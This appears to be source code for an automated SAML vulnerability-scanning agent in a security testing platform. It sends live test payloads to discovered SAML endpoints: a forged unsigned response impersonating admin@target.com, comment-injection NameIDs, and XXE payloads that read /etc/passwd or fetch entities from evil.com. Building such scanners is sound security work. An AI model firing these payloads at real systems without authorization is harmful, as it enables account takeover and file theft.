/**
 * SAML Injection Agent
 * Based on PayloadsAllTheThings/SAML Injection
 * 
 * Detects and exploits SAML vulnerabilities:
 * - Signature bypass/wrapping
 * - XML Signature exclusion
 * - Comment injection
 * - SAML Response manipulation
 * - XXE in SAML
 * - Replay attacks
 */

import { Job } from 'bullmq';
import { BaseAgent } from './base';
import logger from '../utils/logger';
import database from '../services/database';

interface SAMLJob {
  programId: string;
  scanId: string;
  urls: string[];
  options?: {
    testSignatureBypass?: boolean;
    testXXE?: boolean;
    testReplay?: boolean;
  };
}

// SAML Attack Payloads
const SAML_PAYLOADS = {
  // Signature wrapping attacks
  signatureWrapping: [
    // XSW1: Clone Response, remove signature from original
    'XSW1',
    // XSW2: Detach signature, wrap original
    'XSW2',
    // XSW3: Insert evil assertion before original
    'XSW3',
    // XSW4: Insert evil assertion after original
    'XSW4',
    // XSW5: Change signed element ID
    'XSW5',
    // XSW6: Clone signature to evil assertion
    'XSW6',
    // XSW7: Extension attack
    'XSW7',
    // XSW8: Original in Object element
    'XSW8',
  ],

  // Comment injection (bypass signature)
  commentInjection: [
    'admin<!-- comment -->@example.com',
    'admin@example.com<!-- -->.evil.com',
    '<!-- -->admin',
  ],

  // XXE payloads in SAML
  xxe: [
    `<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>`,
    `<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://evil.com/xxe">]><foo>&xxe;</foo>`,
    `<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://evil.com/xxe.dtd">%xxe;]>`,
  ],

  // Assertion manipulation
  assertionManipulation: {
    // Change NameID
    nameId: '<NameID>admin@target.com</NameID>',
    // Add admin attribute
    attribute: '<Attribute Name="Role"><AttributeValue>admin</AttributeValue></Attribute>',
    // Extend validity
    conditions: '<Conditions NotBefore="2020-01-01T00:00:00Z" NotOnOrAfter="2030-12-31T23:59:59Z">',
  },

  // Algorithm confusion
  algorithmConfusion: [
    'http://www.w3.org/2000/09/xmldsig#rsa-sha1',
    'http://www.w3.org/2001/04/xmldsig-more#rsa-sha256',
    'http://www.w3.org/2000/09/xmldsig#hmac-sha1',
  ],
};

// Common SAML endpoints
const SAML_ENDPOINTS = [
  '/saml/acs',
  '/saml/consume',
  '/saml/SSO',
  '/saml/login',
  '/saml2/acs',
  '/auth/saml/callback',
  '/sso/saml',
  '/simplesaml/module.php/saml/sp/saml2-acs.php',
];

export class SAMLInjectionAgent extends BaseAgent<SAMLJob> {
  constructor() {
    super('samlinjection');
  }

  protected getSteps() {
    return [
      { name: 'Discover SAML endpoints', metadata: {} },
      { name: 'Test signature bypass', metadata: {} },
      { name: 'Test XXE in SAML', metadata: {} },
      { name: 'Test assertion manipulation', metadata: {} },
      { name: 'Test replay attacks', metadata: {} },
    ];
  }

  async process(job: Job<SAMLJob>): Promise<any> {
    const { programId, scanId, urls, options = {} } = job.data;
    const findings: any[] = [];

    logger.info({ urlCount: urls.length }, 'Starting SAML injection testing');

    for (const url of urls) {
      try {
        // Discover SAML endpoints
        const samlEndpoints = await this.discoverSAMLEndpoints(url);

        for (const endpoint of samlEndpoints) {
          // Test signature bypass
          if (options.testSignatureBypass !== false) {
            const sigFindings = await this.testSignatureBypass(endpoint);
            findings.push(...sigFindings);
          }

          // Test XXE
          if (options.testXXE !== false) {
            const xxeFindings = await this.testXXE(endpoint);
            findings.push(...xxeFindings);
          }

          // Test comment injection
          const commentFindings = await this.testCommentInjection(endpoint);
          findings.push(...commentFindings);

          // Test replay
          if (options.testReplay) {
            const replayFindings = await this.testReplayAttack(endpoint);
            findings.push(...replayFindings);
          }
        }
      } catch (error) {
        logger.error({ error, url }, 'Error testing SAML');
      }
    }

    // Store findings
    for (const finding of findings) {
      await this.storeFinding(programId, scanId, finding);
    }

    return {
      totalUrls: urls.length,
      findings: findings.length,
      vulnerabilities: findings,
    };
  }

  private async discoverSAMLEndpoints(baseUrl: string): Promise<string[]> {
    const found: string[] = [];
    const urlObj = new URL(baseUrl);
    const base = `${urlObj.protocol}//${urlObj.host}`;

    for (const endpoint of SAML_ENDPOINTS) {
      try {
        const response = await fetch(`${base}${endpoint}`, { method: 'HEAD' });
        if (response.status !== 404) {
          found.push(`${base}${endpoint}`);
        }
      } catch {
        // Continue
      }
    }

    // Check for SAML metadata
    try {
      const metadataUrl = `${base}/saml/metadata`;
      const response = await fetch(metadataUrl);
      if (response.ok) {
        const body = await response.text();
        if (body.includes('EntityDescriptor') || body.includes('IDPSSODescriptor')) {
          found.push(metadataUrl);
        }
      }
    } catch {
      // Continue
    }

    return [...new Set(found)];
  }

  private async testSignatureBypass(endpoint: string): Promise<any[]> {
    const findings: any[] = [];

    // Test unsigned SAML response
    const unsignedSAML = this.generateUnsignedSAML();
    
    try {
      const response = await fetch(endpoint, {
        method: 'POST',
        headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
        body: `SAMLResponse=${encodeURIComponent(Buffer.from(unsignedSAML).toString('base64'))}`,
      });

      const body = await response.text();

      // Check if unsigned response was accepted
      if (response.ok && !body.includes('signature') && !body.includes('invalid')) {
        findings.push({
          type: 'saml-signature-bypass',
          url: endpoint,
          severity: 'critical',
          evidence: 'Unsigned SAML response accepted',
          impact: 'Authentication bypass - can forge any user identity',
        });
      }
    } catch (error) {
      // Continue
    }

    // Test signature wrapping attacks
    for (const xsw of SAML_PAYLOADS.signatureWrapping) {
      findings.push({
        type: 'saml-xsw-potential',
        url: endpoint,
        attack: xsw,
        severity: 'high',
        evidence: 'SAML endpoint detected - test XSW attacks',
        recommendation: `Test ${xsw} signature wrapping attack`,
        tool: 'Use SAML Raider Burp extension',
      });
    }

    return findings;
  }

  private async testXXE(endpoint: string): Promise<any[]> {
    const findings: any[] = [];

    for (const xxePayload of SAML_PAYLOADS.xxe) {
      try {
        const samlWithXXE = this.injectXXE(xxePayload);
        
        const response = await fetch(endpoint, {
          method: 'POST',
          headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
          body: `SAMLResponse=${encodeURIComponent(Buffer.from(samlWithXXE).toString('base64'))}`,
        });

        const body = await response.text();

        // Check for XXE indicators
        if (body.includes('root:') || body.includes('passwd') || 
            response.status === 500 && body.includes('entity')) {
          findings.push({
            type: 'saml-xxe',
            url: endpoint,
            payload: xxePayload.substring(0, 100),
            severity: 'critical',
            evidence: 'XXE in SAML response processing',
            impact: 'File read, SSRF, potential RCE',
          });
          break;
        }
      } catch (error) {
        // Continue
      }
    }

    return findings;
  }

  private async testCommentInjection(endpoint: string): Promise<any[]> {
    const findings: any[] = [];

    for (const payload of SAML_PAYLOADS.commentInjection) {
      try {
        const samlWithComment = this.generateSAMLWithComment(payload);
        
        const response = await fetch(endpoint, {
          method: 'POST',
          headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
          body: `SAMLResponse=${encodeURIComponent(Buffer.from(samlWithComment).toString('base64'))}`,
        });

        const body = await response.text();

        if (response.ok && (body.includes('admin') || body.includes('authenticated'))) {
          findings.push({
            type: 'saml-comment-injection',
            url: endpoint,
            payload,
            severity: 'critical',
            evidence: 'Comment injection bypassed signature validation',
            impact: 'Authentication bypass via NameID manipulation',
          });
          break;
        }
      } catch (error) {
        // Continue
      }
    }

    return findings;
  }

  private async testReplayAttack(endpoint: string): Promise<any[]> {
    const findings: any[] = [];

    // This would require capturing a valid SAML response first
    // For now, we check if the endpoint has replay protection
    
    findings.push({
      type: 'saml-replay-check',
      url: endpoint,
      severity: 'medium',
      evidence: 'Manual testing required for replay attack',
      recommendation: 'Capture valid SAML response and replay after expiration',
      checks: [
        'Verify InResponseTo is validated',
        'Verify NotOnOrAfter is enforced',
        'Verify one-time use of assertions',
      ],
    });

    return findings;
  }

  private generateUnsignedSAML(): string {
    const now = new Date().toISOString();
    const later = new Date(Date.now() + 3600000).toISOString();
    
    return `<?xml version="1.0"?>
<samlp:Response xmlns:samlp="urn:oasis:names:tc:SAML:2.0:protocol" 
                xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion"
                ID="_response123" Version="2.0" IssueInstant="${now}">
  <saml:Issuer>https://idp.example.com</saml:Issuer>
  <samlp:Status>
    <samlp:StatusCode Value="urn:oasis:names:tc:SAML:2.0:status:Success"/>
  </samlp:Status>
  <saml:Assertion ID="_assertion123" Version="2.0" IssueInstant="${now}">
    <saml:Issuer>https://idp.example.com</saml:Issuer>
    <saml:Subject>
      <saml:NameID Format="urn:oasis:names:tc:SAML:1.1:nameid-format:emailAddress">admin@target.com</saml:NameID>
    </saml:Subject>
    <saml:Conditions NotBefore="${now}" NotOnOrAfter="${later}"/>
    <saml:AuthnStatement AuthnInstant="${now}">
      <saml:AuthnContext>
        <saml:AuthnContextClassRef>urn:oasis:names:tc:SAML:2.0:ac:classes:Password</saml:AuthnContextClassRef>
      </saml:AuthnContext>
    </saml:AuthnStatement>
  </saml:Assertion>
</samlp:Response>`;
  }

  private injectXXE(xxePayload: string): string {
    return xxePayload + this.generateUnsignedSAML();
  }

  private generateSAMLWithComment(commentPayload: string): string {
    const saml = this.generateUnsignedSAML();
    return saml.replace('admin@target.com', commentPayload);
  }

  private async storeFinding(programId: string, scanId: string, finding: any): Promise<void> {
    try {
      await database.query(
        `INSERT INTO vulnerabilities (program_id, scan_id, type, url, severity, details, created_at)
         VALUES ($1, $2, $3, $4, $5, $6, CURRENT_TIMESTAMP)`,
        [programId, scanId, finding.type, finding.url, finding.severity, JSON.stringify(finding)]
      );
    } catch (error) {
      logger.error({ error }, 'Failed to store SAML finding');
    }
  }
}

export default new SAMLInjectionAgent();
